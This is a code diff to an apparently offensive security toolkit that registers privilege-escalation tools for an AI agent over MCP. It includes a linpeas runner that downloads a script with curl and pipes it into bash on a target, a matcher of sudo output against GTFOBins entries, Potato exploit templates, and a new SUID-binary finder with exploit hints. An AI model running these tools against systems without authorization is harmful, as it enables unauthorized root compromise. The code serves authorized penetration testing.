@@ -3,8 +3,11 @@
 from __future__ import annotations
 
 import asyncio
+import re as _re_ansi
 import shlex
 from typing import Any
+
+_ANSI_ESCAPE = _re_ansi.compile(r'\x1b\[[0-9;]*[mGKH]')
 
 from kestrel.mcp import registry
 from kestrel.transport import kali_proxy
@@ -39,18 +42,21 @@ async def post_linpeas_run(exec_cmd_template: str, linpeas_url: str = "https://g
     # Build the inner command: try local copy on Kali first, fallback to remote download
     local_check = " || ".join(f"[ -f {p} ] && cat {p}" for p in _LINPEAS_LOCAL_PATHS)
     inner = (
-        f"( {local_check} || curl -ks {shlex.quote(linpeas_url)} ) | bash 2>&1 | tail -c 8000"
+        f"( {local_check} || curl -ks {shlex.quote(linpeas_url)} ) 2>&1 | bash 2>&1 | "
+        r"grep --color=never -E '(\[[\+\!]\]|SUID|sudo|cron|writable|password|CVE|vuln|ROOT|capabilities|NOPASSWD|777|4755|rwx)' "
+        f"| head -c 16000"
     )
     if "{}" in exec_cmd_template:
         cmd = exec_cmd_template.replace("{}", inner)
     else:
         cmd = f"{exec_cmd_template} {shlex.quote(inner)}"
     res = await _run_kali(cmd, timeout=900.0)
-    # Pull out 'PE' (privesc) red lines heuristically
+    # Pull out 'PE' (privesc) red lines heuristically — strip ANSI before matching
     interesting: list[str] = []
     for line in res["stdout"].splitlines():
-        if "[+]" in line or "vuln" in line.lower() or "ROOT" in line:
-            interesting.append(line.strip())
+        clean_line = _ANSI_ESCAPE.sub("", line).strip()
+        if any(marker in clean_line for marker in ("[+]", "[!]", "SUID", "sudo", "ROOT", "vuln", "CVE", "NOPASSWD", "writable", "password", "capabilities")):
+            interesting.append(clean_line)
     return {"finding_count": len(interesting), "interesting": interesting[:50], "rc": res["rc"]}
 
 
@@ -180,12 +186,17 @@ SUDO_GTFOBINS = {
     ),
     category="post",
 )
+def _binary_in_sudo_output(binary: str, text: str) -> bool:
+    """Match exact binary name (not as substring of longer name)."""
+    pattern = rf'[/\s]{_re_ansi.escape(binary)}(?:\s|$)'
+    return bool(_re_ansi.search(pattern, text))
+
+
 async def post_privesc_sudo(sudo_l_output: str) -> dict[str, Any]:
     out_lower = sudo_l_output.lower()
     matches: list[dict[str, Any]] = []
     for binary, poc in SUDO_GTFOBINS.items():
-        # Word-boundary-ish: look for "/binary" or " binary " patterns
-        if f"/{binary}" in out_lower or f" {binary} " in out_lower or out_lower.strip().endswith(binary):
+        if _binary_in_sudo_output(binary, out_lower):
             matches.append({"binary": binary, "poc": poc})
     return {"match_count": len(matches), "matches": matches}
 
@@ -272,3 +283,61 @@ async def post_privesc_potato(windows_build: str, variant: str = "auto") -> dict
         "GodPotato": "GodPotato.exe -cmd \"cmd /c whoami\"",
     }
     return {"variant": variant, "windows_build": windows_build, "cmd_template": cmd_template.get(variant)}
+
+
+# ── SUID check (session-based) ────────────────────────────────────────────────
+
+_SUID_GTFOBINS = {
+    "bash", "dash", "sh", "python", "python3", "perl", "ruby", "node",
+    "find", "vim", "vi", "nano", "less", "more", "awk", "nmap",
+    "env", "cp", "mv", "chmod", "chown", "dd", "tee", "curl", "wget",
+    "pkexec", "gdb", "strace", "screen", "tmux", "docker", "lxd",
+    "git", "php", "lua", "ftp", "socat", "nc", "netcat",
+}
+
+
+@registry.tool(
+    name="post_check_suid",
+    description=(
+        "Find SUID binaries on Linux target via session_exec and match against GTFOBins. "
+        "Fast alternative to linpeas for SUID-based privesc. "
+        "Returns: suid_count, exploitable_count, exploitable list with binary path and PoC hint."
+    ),
+    category="post",
+)
+async def post_check_suid(
+    handle_id: str,
+    machine: str | None = None,
+) -> dict[str, Any]:
+    from kestrel.mcp.tools.session import session_exec  # local import to avoid circular
+
+    cmd = "find / -perm -4000 -type f 2>/dev/null"
+    res = await session_exec(handle_id=handle_id, cmd=cmd, timeout=60.0)
+    stdout = res.get("stdout", "") or ""
+
+    found: list[str] = []
+    exploitable: list[dict] = []
+
+    for line in stdout.splitlines():
+        path = line.strip()
+        if not path or "/" not in path:
+            continue
+        binary_name = path.split("/")[-1]
+        # Strip trailing digits (python3 -> python for matching, but keep original)
+        binary_base = binary_name.rstrip("0123456789")
+        found.append(path)
+        if binary_name in _SUID_GTFOBINS or binary_base in _SUID_GTFOBINS:
+            exploitable.append({
+                "path": path,
+                "binary": binary_name,
+                "gtfobins_url": f"https://gtfobins.github.io/gtfobins/{binary_name}/",
+                "poc_hint": f"{path} -p  # Check GTFOBins for PoC",
+            })
+
+    return {
+        "suid_count": len(found),
+        "exploitable_count": len(exploitable),
+        "exploitable": exploitable,
+        "all_suid": found,
+        "has_findings": len(exploitable) > 0,
+    }
